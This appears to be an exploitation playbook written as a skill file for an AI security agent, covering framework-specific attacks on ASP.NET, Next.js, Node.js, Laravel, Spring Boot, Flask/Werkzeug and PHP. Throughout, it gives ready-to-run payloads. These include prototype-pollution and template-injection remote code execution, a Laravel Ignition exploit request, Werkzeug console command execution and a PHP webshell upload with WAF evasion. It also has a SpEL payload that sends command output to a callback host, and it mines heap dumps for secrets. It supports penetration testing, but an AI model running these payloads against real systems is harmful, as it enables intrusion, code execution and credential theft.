---
name: Framework-Specific Web Attacks
description: Fingerprint and exploit framework-specific web surface — ASP.NET ViewState, Next.js middleware/SSRF, Node.js prototype pollution, Laravel Ignition, Spring Boot Actuator, Flask/Werkzeug debugger, PHP phpinfo-to-RCE.
tags: [web, framework, exploitation, rce, info-disclosure]
recommended_tools: [http_request, http_repeater, httpx_probe, nuclei_scan, curl, python3, whatweb_scan, wappalyzer_scan, feroxbuster_scan, jq]
vuln_classes: []
domain: web
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/hunt-aspnet/SKILL.md, redteam/hunt-nextjs/SKILL.md, redteam/hunt-nodejs/SKILL.md, redteam/hunt-laravel/SKILL.md, redteam/hunt-springboot/SKILL.md, recon/flask-werkzeug-attack/SKILL.md, recon/phpinfo-to-rce/SKILL.md]}
---

# Framework-Specific Web Attacks

Once a web target's framework is identified, framework-specific anti-patterns become the fastest path from recon to high-impact findings: deserialization RCE, auth bypass, credential-laden debug endpoints, and SSRF. This playbook is organized by framework. Always **fingerprint first** (Step 0), then jump to the matching section.

## Step 0 — Fingerprint the framework

Framework detection drives everything downstream. Collect response headers, cookies, error-page bodies, and body markers.

```bash
# Broad fingerprint
curl -sI "https://$TARGET/" | grep -iE "server|x-powered-by|x-aspnet|x-application-context|x-nextjs|set-cookie"
whatweb "https://$TARGET/"

# Force an error page — error banners leak the framework and version
curl -s "https://$TARGET/nonexistent-path-xyz-$(date +%s)"
```

| Signal | Framework |
|---|---|
| `X-AspNet-Version`, `__VIEWSTATE`, `ASP.NET_SessionId`, `Microsoft-IIS` | ASP.NET Webforms |
| `__NEXT_DATA__`, `x-nextjs-*`, `/_next/` paths, `"buildId"` | Next.js |
| `X-Powered-By: Express`, `Cannot GET /`, `.js` in stack traces | Node.js / Express |
| `laravel_session` cookie, `Whoops`/`Ignition` error page, `csrf-token` meta | Laravel (PHP) |
| `Whitelabel Error Page`, `X-Application-Context`, `/actuator`, `org.springframework` | Spring Boot |
| Blue-themed traceback with collapsible frames, `Werkzeug`, `var SECRET=` | Flask / Werkzeug |
| `phpinfo`/`info.php` reachable, `PHP Version` in body | PHP (phpinfo) |

---

## ASP.NET Webforms — ViewState deserialization & disclosure

Crown jewels: SharePoint farms, Telerik UI (`Telerik.Web.UI.WebResource.axd`), classic Webforms enterprise apps, WCF `.svc` admin endpoints, Sitecore/DNN/Umbraco CMS. Deserialization → RCE is among the highest-paying bug classes.

**Surface probes:**
```
/trace.axd          per-app trace viewer (leaks every request + headers)
/elmah.axd          ELMAH error log viewer (stack traces, sometimes creds)
/*.svc?wsdl         WCF service contract  /*.svc/mex  metadata exchange
/*.asmx?WSDL        legacy SOAP
/Telerik.Web.UI.WebResource.axd   Telerik AJAX (CVE-2017-11317 / -2019-18935)
/ChartImg.axd /ScriptResource.axd /WebResource.axd
/_vti_bin/*         SharePoint Web Service Forwarder
```

**Methodology:**
1. Fingerprint exact version — a stale-ViewState POST reliably triggers a 500 whose body carries `Version Information: Microsoft .NET Framework Version:X.X.XXXXX; ASP.NET Version:...`.
2. Spider for every form with `name="__VIEWSTATE"`. Each is a deserialization sink candidate.
3. Check `__VIEWSTATEENCRYPTED`. **Empty value = signed-only** (not encrypted) → recovery of the `validationKey` alone enables arbitrary deserialization. Non-empty = signed AND encrypted (both keys needed).
4. Test the **dual-parser MAC-bypass differential** — send multiple ViewState shapes and classify the error. Trivial/real/flipped/oversize garbage → `"Validation of viewstate MAC failed"`; XML-shaped (`<xss/>`) or `LosFormatter`-prefixed → `"The state information is invalid for this page and might be corrupted"`. The differential proves two distinct deserialization entry points, one dispatching BEFORE the MAC check.
5. A `"...hosted by a Web Farm or cluster, ensure that <machineKey>..."` 500 reveals a multi-WFE farm without machineKey sync — broadcasts topology.
6. `trace.axd` / `elmah.axd` 200 anonymously = Critical (live tokens/PII in trace, connection strings in ELMAH).
7. For each `.svc`, fetch `?wsdl` and `?mex` — metadata is often anonymous even when ops require auth.
8. Request-validator bypass: the validator only covers URL-encoded body + querystring. Move `<` payloads to Cookie / Referer / JSON body / multipart filename.

**Dual-parser differential probe:**
```python
import requests, re
requests.packages.urllib3.disable_warnings()
S = requests.Session(); S.verify = False
r = S.get("https://TARGET/path/page.aspx")
real_vsg = re.search(r'__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)', r.text).group(1)
for label, vs in [("trivial","AAAA"), ("oversize","A"*100000),
                  ("xml-shaped","<xss/>"), ("losformatter","/wEPDwUKMTcxNzgyOTQwMmRk"+"A"*50)]:
    rr = S.post("https://TARGET/path/page.aspx",
                data={"__VIEWSTATE": vs, "__VIEWSTATEGENERATOR": real_vsg})
    print(label, rr.status_code, re.search(r'<title>([^<]+)', rr.text))
```

**Bypass matrix:**
| Defense | Bypass |
|---|---|
| ViewState encrypted (`__VIEWSTATEENCRYPTED` non-empty) | Recover both decryption + validation keys from source/config leak; without keys deserialization is unreachable |
| Request validator blocks `<` | Cookie / Referer / JSON / multipart filename contexts |
| `EnableViewStateMac="true"` | Recover `validationKey` from web.config disclosure, `elmah.axd`, GitHub leak, or `<machineKey>` AutoGenerate fingerprint |
| `trace.axd` localhost-only | `X-Forwarded-For: 127.0.0.1` when trace mode is `localOnly` and app trusts Forwarded-For |
| Telerik patched | Fingerprint version — pre-2017.1.118 = RAU RCE (CVE-2017-11317); 2017Q3–2019Q3 = CVE-2019-18935 |

**Chain to RCE:** signed-only ViewState + leaked `machineKey` → `ysoserial.net` `TypeConfuseDelegate` gadget → command in `w3wp.exe`. SharePoint: unencrypted ViewState + anonymous `_api/contextinfo` FormDigest + `ToolPane.aspx` = CVE-2025-53770 "ToolShell" precondition. CWE-502.

---

## Next.js / React SSR

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Surface:**
```
/_next/image?url=&w=&q=       image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json   prerendered page data — IDOR candidate
/__nextjs_original-stack-frame dev-only stack frame endpoint
/_next/static/chunks/         JS bundles + source maps
__NEXT_DATA__ in HTML         SSR props leaked to client
```

```bash
# Extract build ID (needed for /_next/data/ paths)
BUILD_ID=$(curl -s "https://$TARGET/" | grep -oP '"buildId":"\K[^"]+')
# Source map exposure → reconstruct TS source
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

**Server Actions auth bypass:** action IDs live in HTML/JS bundles (`grep -oP '"action":"[a-f0-9]+"'`). Call one directly with `Next-Action: <ID>` and no session cookie — if it returns data or mutates state, auth was client-side only.
```bash
curl -s -X POST "https://$TARGET/target-page" -H "Next-Action: ACTION_ID" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'
```

**Middleware bypass:** middleware matchers often exclude `/_next/static`. Reach protected routes via the SSG/ISR JSON or encoded paths:
```bash
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

**`/_next/image` SSRF** — confirm by OOB callback only:
```bash
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=http://UNIQUE.COLLAB_HOST/&w=64&q=75"
```
FALSE-POSITIVE GUARD: `/_next/image` only fetches URLs allowed by `images.remotePatterns`. A non-whitelisted `url` returns **400 by default** (normal allowlist rejection, not a bypass). A **200** returns an *optimized image*, not the upstream body — status code alone NEVER confirms SSRF. Confirm via an OOB callback to a unique Collaborator subdomain. Note CVE-2024-34351 (GHSA-fr5h-rqp8-mj6g, 13.4.0 → <14.1.1) is a **Server Actions** SSRF (relative redirect trusting the `Host` header), NOT a `/_next/image` bug.

**`/_next/data/` IDOR / `__NEXT_DATA__` leakage:** iterate JSON paths per user id; parse `__NEXT_DATA__.props` for non-public secrets.
```bash
curl -s "https://$TARGET/dashboard" | python3 -c "import sys,re,json; m=re.search(r'__NEXT_DATA__[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)).get('props',{}),indent=2))"
```

**Debug endpoints** (`__nextjs_launch-editor`, `__nextjs_original-stack-frame`) exist ONLY under `next dev`. A 404 in production is expected — treat any non-404 as the real finding, never report a 404/filtered response as confirmation.

---

## Node.js / Express

Crown jewel: prototype pollution reaching a Node backend sink = Critical RCE.

```bash
curl -sI "https://$TARGET/" | grep -i "x-powered-by\|express"
curl -s "https://$TARGET/package.json"; curl -s "https://$TARGET/package-lock.json"
```

**Prototype pollution detection** — accept a `__proto__` / `constructor.prototype` key, then confirm it reflects in a later response:
```bash
curl -s -X POST "https://$TARGET/api/merge" -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'
curl -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"   # qs library
curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin"            # confirm
```

**Pollution → RCE sinks:**
```bash
# child_process via options.shell / NODE_OPTIONS pollution
curl -s -X POST "https://$TARGET/api/update" -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/fd/0"}}'
# lodash template (CVE-2021-23337)
curl -s -X POST "https://$TARGET/api/render" -H "Content-Type: application/json" \
  -d '{"__proto__":{"sourceURL":"\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'
# EJS outputFunctionName pollution (CVE-2022-29078)
```
Confirm the sink with an OOB callback — pollution alone is only a primitive.

**Template engine SSTI (EJS / Pug / Handlebars):** `<%= 7*7 %>` → 49 confirms EJS eval; then `<%= process.mainModule.require("child_process").execSync("id").toString() %>`. Pug: `- var x = root.process\n= x.mainModule.require("child_process").execSync("id")`.

**Express `trust proxy` abuse:** `app.set('trust proxy', true)` makes `X-Forwarded-For` authoritative → spoof `127.0.0.1` to bypass IP allowlists, or rotate fake IPs to defeat login rate limits.

**LFI → env exfil:** `/proc/self/environ` (env vars incl. cloud keys), `/proc/self/cmdline`, `/proc/self/cwd`.

---

## Laravel (PHP)

Crown jewel: `APP_DEBUG=true` in production = instant RCE via Ignition (CVE-2021-3129).

```bash
curl -sI "https://$TARGET/" | grep -i "laravel_session"
curl -s "https://$TARGET/nonexistent" | grep -i "Whoops\|Ignition"   # debug mode ON
```

**Ignition RCE (CVE-2021-3129, Laravel < 8.4.2):** debug mode + writable `storage/logs`. Tool: `ambionics/laravel-ignition-rce`. Manual solution request:
```bash
curl -s -X POST "https://$TARGET/_ignition/execute-solution" -H "Content-Type: application/json" \
  -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
       "parameters":{"variableName":"x","viewFile":"php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"}}'
```

**Telescope / Horizon dashboards** (unauthenticated = High): `/telescope/api/requests`, `/telescope/api/environment`, `/horizon/api/jobs/failed` — failed-job payloads often carry full request data incl. auth tokens.

**.env / APP_KEY exposure** (Critical): `/.env`, `/.env.production`, `/.env.backup`. A leaked `APP_KEY` decrypts every Laravel encrypted cookie → forge session → ATO, and enables cookie-deserialization RCE via `phpggc` (`Laravel/RCE5`).

**Mass assignment (Eloquent):** add `is_admin:true` / `role:admin` to profile-update or registration bodies when `$guarded`/`$fillable` are misconfigured. **Signed-URL bypass:** tamper a non-`signature` param, drop `&signature=`, or append extra params — proper signing must validate all.

---

## Spring Boot

Crown jewel: `/actuator/heapdump` = full JVM heap with plaintext secrets in memory.

```bash
curl -sI "https://$TARGET/" | grep -i "x-application-context"
curl -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page"
for base in "" "/manage" "/management" "/app"; do
  curl -s -o /dev/null -w "%{http_code} $base/actuator\n" "https://$TARGET$base/actuator"; done
```

**Actuator enumeration** — do NOT trust HTTP 200 alone (Spring serves 200 + Whitelabel/login for many paths); require actuator-shaped JSON:
```bash
BASE="https://$TARGET/actuator"
for EP in env heapdump threaddump mappings beans loggers configprops shutdown httptrace jolokia; do
  CT=$(curl -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
  echo "$CT" | grep -qi json && echo "[+] check $BASE/$EP"; done
curl -s "$BASE/env" | grep -iE "password|secret|token|credential"
```

**Heap dump mining:**
```bash
curl -s "$BASE/heapdump" -o /tmp/hd.hprof
strings /tmp/hd.hprof | grep -oE "AKIA[A-Z0-9]{16}|sk_live_[A-Za-z0-9]+|Bearer [A-Za-z0-9._-]+" | sort -u
strings /tmp/hd.hprof | grep -iP "(password|passwd|pwd)\s*[=:]\s*\S+" | sort -u
```

**H2 console RCE** (`/h2-console`, default `sa`/empty, `jdbc:h2:mem:testdb`): `CREATE ALIAS EXEC AS $$ ... Runtime.getRuntime().exec(...) $$; CALL EXEC('id');`.

**SpEL injection:** `#{7*7}` → 49 confirms eval. `exec()` returns a `Process` (no reflected output) — confirm RCE via OOB curl callback: `#{T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","curl COLLAB_HOST/$(id|base64)"})}`. CVE-2022-22963 (Spring Cloud Function): `spring.cloud.function.routing-expression:` header on `/functionRouter`.

**Spring4Shell (CVE-2022-22965)** — Spring < 5.3.18/5.2.20, JDK 9+, WAR-on-Tomcat. Detection: `class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/` → OOB callback. Exploitation writes a JSP webshell via `class.module.classLoader.resources.context.parent.pipeline.first.*` params.

**Jolokia (JMX over HTTP):** `/jolokia/list` enumerates MBeans; `/jolokia/read/java.lang:type=Runtime/SystemProperties` leaks properties; MLet MBean deploy → RCE.

---

## Flask / Werkzeug debugger

Flask with `debug=True` enables the Werkzeug debugger — stack traces plus an optional interactive Python console that activates on any unhandled 500. Distinctive blue-themed HTML with collapsible frames and source context.

**Detection** — trigger a 500 on common paths, look for `Werkzeug`, `Traceback`, `SECRET=`, `CONSOLE_MODE`, `EVALEX`:
```bash
for p in /sitemap.xml /error /500 /debug /env /config; do
  curl -sk "https://$TARGET:PORT$p" | grep -qE "Traceback|Werkzeug" && echo "TRIGGERED: $p"; done
```

**Phase 1 — disclosure:** the traceback leaks full server paths (venv layout, Python version, extensions like `flask_cors`), source-code context (5 lines per frame), and the debugger `SECRET` in HTML (`var SECRET="vYQ9...";`).

**Phase 2 — console RCE (only if `EVALEX=true` AND `CONSOLE_MODE=true`):**
```bash
curl -sk "https://$TARGET:PORT/sitemap.xml" | grep -oE '(CONSOLE_MODE|EVALEX|SECRET)="?[^"&;]+'
curl -sk -X POST "https://$TARGET:PORT/sitemap.xml?__debugger__=yes&cmd=e&s=SECRET" \
  -d "code=__import__('os').system('id')"
```
Signal check: `/console` returning **400** = debugger active but console disabled; **404** = no debugger; **200** with console UI = RCE available.

**Pitfalls:** `EVALEX=false` (common in prod) means NO console RCE — the SECRET alone does not execute code. Not every 500 is Werkzeug (JSON-only 500s are plain Flask). A CORS wildcard (`Access-Control-Allow-Origin: *`) on the error page lets an attacker site read the SECRET and traceback via `fetch()`. Every debugger request logs a 500 — be conservative.

---

## PHP phpinfo → RCE chain

An exposed `info.php` / `phpinfo.php` reveals whether the host is one file-upload away from RCE.

```bash
curl -sk --max-time 15 "https://$TARGET/info.php" > /tmp/phpinfo.html
grep -q "PHP Version" /tmp/phpinfo.html || echo "[-] not a real phpinfo (SPA catch-all)"
grep -A1 'disable_functions' /tmp/phpinfo.html | sed 's/<[^>]*>//g'
```

| Check | Look for | Implication |
|---|---|---|
| `disable_functions` | only `pcntl_*` | all exec available — RCE possible |
| `disable_functions` | `exec,system,passthru,shell_exec,popen,proc_open` | exec blocked — need bypass |
| `allow_url_include` | On | RFI directly possible |
| `open_basedir` | unset or wide | broad file access |
| `putenv` | available | LD_PRELOAD bypass viable |
| `FFI` | enabled + not disabled | FFI bypass (PHP 7.4+) |
| PHP version | < 7.4 | EOL — more unpatched CVEs |

**Chain:** if an exec function is available, any upload vector on the same host reaches RCE. Discover vectors — WordPress open registration + XMLRPC `wp.uploadFile`, contact-form file upload, Gravity Forms / Elementor endpoints:
```bash
curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' | grep -o 'wp.uploadFile'
```
Upload a minimal webshell (`<?php system($_REQUEST['c']); ?>`), then verify: `curl -sk "$WEBSHELL_URL?c=id"`. If a WAF blocks the shell on access, try `.phtml`/`.php5`/`.pht` extensions or obfuscation. CWE-434/CWE-94.

---

## Cross-framework validation gate (Gate 0)

Before reporting, confirm attacker-attainable impact, not just a primitive:
- **Disclosure endpoints** (`trace.axd`, `elmah.axd`, `/actuator/env`, Telescope, Werkzeug traceback) are only Critical when they leak *live* credentials/tokens; pure stack traces are usually Low.
- **Deserialization / pollution / SpEL primitives** are Critical only when the chain reaches a reachable RCE sink — prove it with `id` output or an OOB callback.
- **SSRF** is confirmed by an OOB callback to a unique per-test subdomain, never by a status code.
- Every step must be copy-paste reproducible in <10 minutes; link the public exploit tool (`ysoserial.net`, `phpggc`, `ambionics/laravel-ignition-rce`) and the exact gadget/CVE.
